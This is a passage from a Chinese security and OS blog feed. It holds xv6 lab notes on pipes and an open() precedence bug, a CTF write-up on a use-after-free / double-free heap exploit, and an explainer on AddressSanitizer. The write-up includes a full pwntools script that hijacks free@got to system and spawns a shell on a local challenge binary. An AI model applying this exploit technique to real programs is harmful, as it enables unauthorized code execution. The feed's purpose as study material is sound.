class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先C语言中的<code>read</code>函数默认情况下只有在读取到指定字节数的数据或者遇到<code>EOF</code>(文件结束)标志时停止，否则，如果<code>read</code>函数没有读到指定字节数且没有遇到<code>EOF</code>，则会阻塞，并等待新数据的到来。<br>pipe默认是阻塞的，在写管道开启的情况下，如果读管道中没有数据，则会阻塞读操作，直到管道另一端写入数据。<br>在上面的代码中，<code>fork</code>函数运行，此时管道p的读端和写端都没有关闭。因为关闭管道p写端的代码放在父进程中，子进程实际上并没有关闭管道p的写端，所以子进程读完读端数据后，阻塞了。<br>因此我们将关闭管道写端的代码放在fork之前，这样可以保证在子进程和父进程中，管道写端是关闭的。</p><p>可以考虑以下程序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> p1[<span class="number">2</span>];</span><br><span class="line">    pipe(p1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]Test pipe: %d %d\n&quot;</span>, p1[<span class="number">0</span>], p1[<span class="number">1</span>]); </span><br><span class="line">    <span class="type">int</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;hello world\n&quot;</span>);</span><br><span class="line">        <span class="type">int</span> p[<span class="number">2</span>];</span><br><span class="line">        pipe(p);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*]Child pipe: %d %d\n&quot;</span>, p[<span class="number">0</span>], p[<span class="number">1</span>]);</span><br><span class="line">        <span class="comment">// 尝试向Test pipe中写</span></span><br><span class="line">        write(p1[<span class="number">1</span>], p, <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">        <span class="type">int</span> test_read;</span><br><span class="line">        read(p1[<span class="number">0</span>], &amp;test_read, <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*]Test pipe read: %d\n&quot;</span>, test_read);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        close(p1[<span class="number">0</span>]);</span><br><span class="line">        close(p1[<span class="number">1</span>]);</span><br><span class="line">        <span class="type">int</span> k = <span class="number">10</span>;</span><br><span class="line">        <span class="comment">// 尝试向Test pipe中写</span></span><br><span class="line">        <span class="keyword">if</span> (write(p1[<span class="number">1</span>], &amp;k, <span class="keyword">sizeof</span>(<span class="type">int</span>)) != <span class="keyword">sizeof</span>(<span class="type">int</span>)) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[*]Parent: Test pipe closed\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> p[<span class="number">2</span>];</span><br><span class="line">    pipe(p);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]Parent Pipe: %d %d\n&quot;</span>, p[<span class="number">0</span>], p[<span class="number">1</span>]);     </span><br><span class="line">    wait(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果如下。可以看到，调用<code>fork</code>函数之后，在父进程中关闭p1管道，并没有影响到子进程的p1管道。因此在primes程序中，父进程中关闭管道写端实际上并没有影响到子进程的管道。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*]Test pipe: 3 4</span><br><span class="line">[*]Parent: Test pipe closed</span><br><span class="line">[*]Parent Pipe: 3 4</span><br><span class="line">hello world</span><br><span class="line">[*]Child pipe: 5 6</span><br><span class="line">[*]Test pipe read: 5</span><br></pre></td></tr></table></figure><h3 id="find-2">find</h3><p>发现<code>.</code>没有被当成一个目录(<code>st.type != T_DIR</code>)<br>原因：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fd = open(path, O_RDONLY) &lt; <span class="number">0</span>) &#123;...&#125;</span><br></pre></td></tr></table></figure><p>在这里面，fd 的值是<code>open(path, O_RDONLY) &lt; 0</code>的结果，为0，因此打开的文件是不对的。下面的例子可以说明这个情况</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> fd1, fd2;</span><br><span class="line">   <span class="keyword">if</span> (fd1 = open(<span class="string">&quot;a.c&quot;</span>, O_RDONLY) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">&quot;a\n&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> ((fd2 = open(<span class="string">&quot;a.c&quot;</span>, O_RDONLY)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">&quot;b\n&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>, fd1, fd2);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 输出：</span></span><br><span class="line"><span class="comment"> * 0 4</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> OS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Use After Free 分析</title>
      <link href="/2023/11/uaf/"/>
      <url>/2023/11/uaf/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞成因">漏洞成因</h2><p>省流版：释放了堆空间后，没有将指向该空间的指针设为空（野指针），导致程序对该内存进行了修改。</p><h2 id="程序分析">程序分析</h2><p>使用<code>checksec</code><br><img src="https://gitee.com/vegetablechicken-dev/pic/raw/master/img/uaf/2023-11-27%20202931.png" alt="p"><br>使用IDA分析程序<br><code>main</code>函数如图，主要实现了选择操作的作用<br><img src="https://gitee.com/vegetablechicken-dev/pic/raw/master/img/uaf/Pasted%20image%2020231127203808.png" alt="p"><br>当输入1时进入<code>new_</code>函数，我们首先输入我们希望创建块的大小，调用<code>malloc</code>创建<code>chunk</code>，并存储<code>chunk</code>的指针和大小。<br><img src="https://gitee.com/vegetablechicken-dev/pic/raw/master/img/uaf/Pasted%20image%2020231127204002.png" alt="p"><br>输入2时调用<code>write_</code>函数，首先我们选择需要修改的<code>chunk</code>的索引，并且通过<code>read</code>函数读入内容。<br><img src="https://gitee.com/vegetablechicken-dev/pic/raw/master/img/uaf/Pasted%20image%2020231127204112.png" alt="p"><br>输入3时调用<code>delete_</code>函数。该函数需要我们输入要删除的<code>chunk</code>索引，并调用<code>free</code>漏洞释放空间。可以看到在释放空间后并没有将对应的指针置为空的操作，可能存在<code>double_free</code>漏洞。<br><img src="https://gitee.com/vegetablechicken-dev/pic/raw/master/img/uaf/Pasted%20image%2020231127204313.png" alt="p"></p><h2 id="利用过程介绍">利用过程介绍</h2><p><code>0x400909</code>即为<code>new_</code>函数所在的位置，运行两次<code>0x400c64</code>函数后，使用<code>heap</code>命令查看堆被分配的情况。可以看到已经分配了两个<code>chunk</code>，地址分别为<code>0xef7000</code>和<code>0xef7070</code>，我们分别定义它们为<code>chunk0</code>和<code>chunk1</code>。我们为每个<code>chunk</code>申请了<code>0x60</code>字节的内存，再加上<code>0x10</code>字节的<code>prev_size</code>和<code>size</code>信息，每个<code>chunk</code>共<code>0x70</code>字节。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">New(p, <span class="number">0x60</span>)</span><br><span class="line">New(p, <span class="number">0x60</span>)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/vegetablechicken-dev/pic/raw/master/img/uaf/Pasted%20image%2020231128021046.png" alt="p"><br>执行一次<code>delete_(0x400aef)</code>函数后，<code>chunk0</code>被<code>free</code>。<br><img src="https://gitee.com/vegetablechicken-dev/pic/raw/master/img/uaf/Pasted%20image%2020231128021135.png" alt="p"><br>执行三次<code>0x400aef</code>后，使用<code>heap</code>查看堆的情况，两个<code>chunk</code>均被释放</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Delete(p, <span class="number">0</span>)</span><br><span class="line">Delete(p, <span class="number">1</span>)</span><br><span class="line">Delete(p, <span class="number">0</span>)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/vegetablechicken-dev/pic/raw/master/img/uaf/Pasted%20image%2020231128021208.png" alt="p"><br><code>fastbins</code>查看fastbin的情况，经过三次<code>free</code>,我们构造出了<code>chunk0(0xef7000)-&gt;chunk1(0xef7070)-&gt;chunk0(0xef7000)</code>的<code>fastbin</code>链，触发了<code>double free</code>漏洞。<br><img src="https://gitee.com/vegetablechicken-dev/pic/raw/master/img/uaf/Pasted%20image%2020231128021230.png" alt="p"><br>此时执行一次<code>0x400909(new_)</code>函数，<code>fastbins</code>变成如图所示的情况，这表明<code>chunk0</code>被分配出去了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">New(p, <span class="number">0x60</span>)</span><br><span class="line">Write(p, <span class="number">2</span>, p64(<span class="number">0x60208d</span>))</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/vegetablechicken-dev/pic/raw/master/img/uaf/Pasted%20image%2020231128021440.png" alt="p"><br>我们也可以通过查看<code>ptr</code>数组元素获知，可以看到第三个元素（即索引为2）为<code>chunk0</code>的地址（因为<code>chunk0</code>的头<code>0x10</code>字节存储<code>chunk</code>的必要信息，我们可以控制的地址从<code>0xef7010</code>开始）<br><img src="https://gitee.com/vegetablechicken-dev/pic/raw/master/img/uaf/Pasted%20image%2020231128021737.png" alt="p"><br>执行完<code>0x4009f9(write_)</code>函数后，<code>fastbins</code>内容变为如图所示。因为我们能控制<code>0xef7000</code>中的内容。对于一个<code>free chunk</code>来说，第<code>0x10</code>到<code>0x20</code>字节是<code>fd</code>指针，用于指向下一个<code>chunk</code>。而从<code>0x10</code>字节开始正好是我们可以控制的内容。因此我们可以修改<code>fd</code>指针。堆管理器默认<code>fastbins</code>中<code>fd</code>指向的是下一个<code>free chunk</code>。因此我们的<code>fastbins</code>变为<code>0xef7070-&gt;0xef7000-&gt;0x60208d</code>（即让<code>fd</code>指向我们想控制的区域），因此我们可以控制<code>0x60208d</code>的<code>chunk</code>。<br><img src="https://gitee.com/vegetablechicken-dev/pic/raw/master/img/uaf/Pasted%20image%2020231128022114.png" alt="p"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">New(p, <span class="number">0x60</span>)</span><br><span class="line">New(p, <span class="number">0x60</span>)</span><br><span class="line">New(p, <span class="number">0x60</span>)</span><br></pre></td></tr></table></figure><p>执行两次<code>0x400909(new_)</code>函数后，<code>fastbins</code>如图所示。<br><img src="https://gitee.com/vegetablechicken-dev/pic/raw/master/img/uaf/Pasted%20image%2020231128022927.png" alt="p"><br>再执行一次<br><img src="https://gitee.com/vegetablechicken-dev/pic/raw/master/img/uaf/Pasted%20image%2020231128023026.png" alt="p"><br>查看<code>ptr</code>的内容，由此可以获得三次<code>new_</code>操作，分配到的内存地址。第二次<code>malloc</code>将<code>chunk1</code>从<code>fastbins</code>中移出，第三次<code>malloc</code>将<code>chunk0</code>从<code>fastbins</code>中移出，第四次将<code>0x60208d</code>从<code>fastbins</code>中移出。<br><img src="https://gitee.com/vegetablechicken-dev/pic/raw/master/img/uaf/Pasted%20image%2020231128023126.png" alt="p"><br>因为<code>0x60209d</code>是离<code>ptr</code>较近的地址，<code>write_</code>函数在修改时通过我们传入的索引在<code>ptr</code>中获取地址，并修改对应地址的内容，因此我们可以修改<code>ptr</code>存储的地址为我们想控制的地址，并且在<code>write_</code>函数中修改，即可实现任意内存写。<br>我们首先在<code>ptr[4]</code>，即<code>0xef7080</code>中传入<code>/bin/sh</code>。<br><img src="https://gitee.com/vegetablechicken-dev/pic/raw/master/img/uaf/Pasted%20image%2020231128024459.png" alt="p"><br>根据我们的观察，可以在<code>delete_</code>函数中，利用<code>free</code>函数拿<code>shell</code>。只要我们控制了<code>free</code>函数的<code>got</code>表，将其修改为<code>system</code>的地址，当我们调用<code>free(ptr[4])</code>时，就相当于调用<code>system('/bin/sh')</code>，即可拿<code>shell</code>。根据我们的分析，只需要将<code>system@plt</code>的内容写入<code>free@got</code>的位置即可。<br>我们先构造<code>aaaa</code>，传入测试<br><img src="https://gitee.com/vegetablechicken-dev/pic/raw/master/img/uaf/Pasted%20image%2020231128025646.png" alt="p"><br><img src="https://gitee.com/vegetablechicken-dev/pic/raw/master/img/uaf/Pasted%20image%2020231128025753.png" alt="p"><br>因此我们构造的<code>payload</code>为19字节填充+<code>p64(free@got)</code><br>代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Write(p, <span class="number">4</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">3</span> + p64(elf.got[<span class="string">&#x27;free&#x27;</span>]) * <span class="number">3</span></span><br><span class="line">Write(p, <span class="number">5</span>, payload)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">Write(p, <span class="number">2</span>, p64(elf.plt[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">Delete(p, <span class="number">4</span>)</span><br></pre></td></tr></table></figure><p>写入结果如图（因为开启了ASLR，所以地址会有些许变化），可以看到<code>ptr[2]</code>被替换为<code>free@got</code>的位置。<br><img src="https://gitee.com/vegetablechicken-dev/pic/raw/master/img/uaf/Pasted%20image%2020231128115343.png" alt="p"><br>进一步执行，<code>free@got</code>表内容被替换为<code>system@plt</code>。<br><img src="https://gitee.com/vegetablechicken-dev/pic/raw/master/img/uaf/Pasted%20image%2020231128115513.png" alt="p"></p><h2 id="最终结果">最终结果</h2><p>最终成功拿到<code>shell</code><br><img src="https://gitee.com/vegetablechicken-dev/pic/raw/master/img/uaf/Pasted%20image%2020231128120047.png" alt="p"><br>代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">New</span>(<span class="params">p, chunk_size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;chunk:&#x27;</span>, <span class="built_in">str</span>(chunk_size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Write</span>(<span class="params">p, i, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice:&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index:&#x27;</span>, <span class="built_in">str</span>(i).encode())</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;content:&#x27;</span>, content)</span><br><span class="line">    sleep(<span class="number">0.3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Delete</span>(<span class="params">p, i</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice:&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index:&#x27;</span>, <span class="built_in">str</span>(i).encode())</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;main&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">gdb.attach(p)</span></span><br><span class="line"><span class="string">sleep(3)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">New(p, <span class="number">0x60</span>) <span class="comment"># 0</span></span><br><span class="line">New(p, <span class="number">0x60</span>) <span class="comment"># 1</span></span><br><span class="line">Delete(p, <span class="number">0</span>)</span><br><span class="line">Delete(p, <span class="number">1</span>)</span><br><span class="line">Delete(p, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">New(p, <span class="number">0x60</span>) <span class="comment"># 2</span></span><br><span class="line">Write(p, <span class="number">2</span>, p64(<span class="number">0x60208d</span>))</span><br><span class="line"></span><br><span class="line">New(p, <span class="number">0x60</span>) <span class="comment"># 3</span></span><br><span class="line">New(p, <span class="number">0x60</span>) <span class="comment"># 4</span></span><br><span class="line">New(p, <span class="number">0x60</span>) <span class="comment"># 5</span></span><br><span class="line"></span><br><span class="line">Write(p, <span class="number">4</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">3</span> + p64(elf.got[<span class="string">&#x27;free&#x27;</span>]) * <span class="number">3</span></span><br><span class="line">Write(p, <span class="number">5</span>, payload)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">Write(p, <span class="number">2</span>, p64(elf.plt[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">Delete(p, <span class="number">4</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>地址消毒</title>
      <link href="/2023/11/asan/"/>
      <url>/2023/11/asan/</url>
      
        <content type="html"><![CDATA[<h2 id="前言">前言</h2><p>做项目的时候水的一篇，水最多的一集</p><h2 id="正文">正文</h2><p>内存访问错误, 比如缓冲区溢出, <code>use-after-free</code>等错误是比较难以捕捉的。这类错误简单地说就是访问了不能被访问的区域, 如果我们能够记录所有有效的内存区， 并且在访问内存之前进行检查，就可以有效地获知这些错误的发生。地址消毒技术 (ASAN) 可以发现堆栈、全局变量对应的越界以及<code>use-after-free</code>等错误。<br>ASAN，全称 AddressSanitizer，地址消毒技术。可以用来检测内存问题，主要是进行编译器级别的HOOK与插桩,目前主流编译器,如Clang，GCC，MSVC都支持。<br>地址消毒技术由两部分组成：插桩模块和一个运行时库(<code>libasan.so.x</code>)。插桩模块在编译过程中，会修改代码去检查每次内存访问的影子内存，并且在栈和全局变量周围创建被标记的红区（redzone）来检测上溢出和下溢出。简单来说，地址消毒技术就是使用影子内存来记录是否每个应用内存的字节是可访问的。当前的实现是基于LLVM编译器，运行时库修改了malloc，free和其他函数，在堆区域上下创建红区，检测释放后堆区域的使用，并且在错误发生时报告。</p><p>（1）影子内存（shadow memory)</p><p>通常情况下内存地址至少是8字节对齐的。因此任何8字节对齐的内存序列处于以下9中状态之一：前k（0&lt;=k&lt;=8）字节是可寻址的，剩下的8-k个是不可以的。我们可以仅使用1字节对这些状态进行编码。</p><p><img src="image-20231102114850211.png" alt="image-20231102114850211"></p><p>图 使用地址消毒技术后的虚拟内存分布</p><p>ASAN会为影子内存分配两片连续的内存区域，并且使用了以下的简单算法将我们要访问的内存地址映射到影子内存中去。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ShadowAddr = (Addr &gt;&gt; <span class="number">3</span>) + Offset</span><br></pre></td></tr></table></figure><p>影子内存本身也使用同样的映射算法，但是影子内存会映射到坏区域，因为影子内存是ASAN添加的内存区域，程序是不能访问的。同时坏区域在页表中是禁止被访问的。</p><p>影子内存用一字节存储了对应用户内存上8字节的可访问状态。在ASAN中，有以下状态</p><ul><li>0 - 该8字节均可访问</li><li>k (1 &lt;= k &lt;= 7) - 前k个字节可访问</li><li>负数 - 该8字节均不可访问</li></ul><p>（2）指令</p><p>需要在编译时添加ASAN编译选项才可以使用ASAN功能。通常ASAN的指令是LLVM的优化阶段添加的。</p><p>比如进行</p><p>（3）运行时库</p><p>运行时库的主要功能是管理影子内存，同时对malloc和free等函数进行了修改。</p><p>malloc和free函数被修改为特殊的实现。malloc函数会分配额外的内存（红区）包围返回的区域上下。红区越大，被检测到的上溢出和下溢出越大。内存分配器的内存区域被一些空闲链表管理，当一个空闲链表是空时，一片内存区域和红区被从系统分配（如mmap）。对于n个区域我们分配n+1个红区（一个内存区域右边的红区就是下一个区域左边的红区）。左边的红区用来存储内存分配器内部的数据（如分配大小，线程ID等）。而且，堆红区的最小大小是32bytes。</p><p>free函数给整个内存区域下毒并且将它放入隔离区，也就是说这块区域不会很快被malloc分配。目前，隔离区实现为一个FIFO队列，保持一定大小的内存。</p><p>为了检测到全局变量和栈对象的越界访问，ASAN必须在它们周围创建红区。对于全局变量，红区在编译时刻被创建，红区的地址在应用启动时被传给运行时库。运行时库记录红区地址以便报告错误。对于栈对象，红区被在运行时创建和下毒。</p><h2 id="References">References</h2><p>[1]Konstantin Serebryany, Derek Bruening, Alexander Potapenko, and Dmitry Vyukov. 2012. AddressSanitizer: a fast address sanity checker. In Proceedings of the 2012 USENIX conference on Annual Technical Conference (USENIX ATC’12). USENIX Association, USA, 28.</p><p>[2] Derek Bruening and Qin Zhao. Practical memory checking with Dr. Memory. In Proc. of the International Symposium on Code Generation and Optimization (CGO ’11), pages 213–223, April 2011.</p><p>[3] Marc Br ¨unink, Martin S ¨ußkraut, and Christof Fetzer. Boundless memory allocations for memory safety and high availability. In Proc. of the 41st Annual IEEE/IFIP International Conference on Dependable Systems and Networks (DSN 2011). IEEE Computer Society, June 2011.</p><p>[4] Winnie Cheng, Qin Zhao, Bei Yu, and Scott Hiroshige. Tainttrace: Efficient flow tracing with dynamic binary rewriting. In Proc. of the 11th IEEE Symposium on Computers and Communications (ISCC ’06), pages 749–754, 2006.</p><p>[5] Frank Ch. Eigler. Mudflap: pointer use checking for C/C++. Red Hat Inc.</p><p>[6] Niranjan Hasabnis, Ashish Misra, and R. Sekar. Light-weight bounds checking. In Proc. of the International Symposium on Code Generation and Optimization (CGO ’12), pages 135–144, April 2012.</p><p>[7] Reed Hastings and Bob Joyce. Purify: Fast detection of memory leaks and access errors. In Proc. of the Winter USENIX Conference, pages 125–136, January 1992. [14] IBM Research. GCC extension for protecting applications from stack-smashing attacks. <a href="http://researchweb.watson.ibm.com/">http://researchweb.watson.ibm.com/</a> trl/projects/security/ssp/.</p><p>[8] Intel. Intel Parallel Inspector. <a href="http://software.intel.com/">http://software.intel.com/</a> en-us/intel-parallel-inspector/.</p><p>[9] Mac OS X Developer Library. Memory Usage Performance Guidelines: Enabling the Malloc Debugging Features. <a href="http://developer.apple.com/library/mac/">http://developer.apple.com/library/mac/</a> #documentation/darwin/reference/manpages/ man3/libgmalloc.3.html.</p><p>[10] Micro Focus. BoundsChecker. <a href="http://www.microfocus.com/">http://www.microfocus.com/</a> products/micro-focus-developer/devpartner/ visual-c.aspx.</p><p>[11] Microsoft Support. How to use Pageheap.exe in Windows XP, Windows 2000, and Windows Server 2003. <a href="http://support.microsoft.com/kb/286470">http://support.microsoft.com/kb/286470</a>.</p><p>[12] George C. Necula, Scott McPeak, and Westley Weimer. CCured: Type-safe retrotting of legacy code. In Proc. of the , Principles of Programming Languages, pages 128–139, 2002.</p><p>[13] Nicholas Nethercote and Julian Seward. How to shadow every byte of memory used by a program. In Proc. of the 3rd International Conference on Virtual Execution Environments (VEE ’07), pages 65–74, June 2007.</p><p>[14] Nicholas Nethercote and Julian Seward. Valgrind: A framework for heavyweight dynamic binary instrumentation. In Proc. of the ACM SIGPLAN Conference on Programming Language Design and Implementation (PLDI ’07), pages 89–100, June 2007.</p><p>[15] Gene Novark and Emery D. Berger. DieHarder: securing the heap. In Proc. of the 17th ACM conference on Computer and communications security, CCS ’10, pages 573–584. ACM, 2010.</p><p>[16] Oracle. Sun Memory Error Discovery Tool (Discover). <a href="http://download.oracle.com/docs/cd/E19205-01/">http://download.oracle.com/docs/cd/E19205-01/</a> 821-1784/6nmoc18gq/index.html.</p><p>[17] Parasoft. Insure++. <a href="http://www.parasoft.com/jsp/">http://www.parasoft.com/jsp/</a> products/insure.jsp?itemId=63. [25] Bruce Perens. Electric Fence. <a href="http://perens.com/FreeSoftware/ElectricFence/">http://perens.com/FreeSoftware/ElectricFence/</a>.</p><p>[18] Feng Qin, Cheng Wang, Zhenmin Li, Ho-seop Kim, Yuanyuan Zhou, and Youfeng Wu. LIFT: A low-overhead practical information flow tracking system for detecting security attacks. In Proc. of the 39th International Symposium on Microarchitecture (MICRO 39), pages 135–148, 2006.</p><p>[19]Danecek P, Bonfield J K, Liddle J, et al. Twelve years of SAMtools and BCFtools[J]. Gigascience, 2021, 10(2): giab008.</p>]]></content>
      
      
      <categories>
          
          <category> sec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go语言基础</title>
      <link href="/2023/07/ez-golang/"/>
      <url>/2023/07/ez-golang/</url>
      
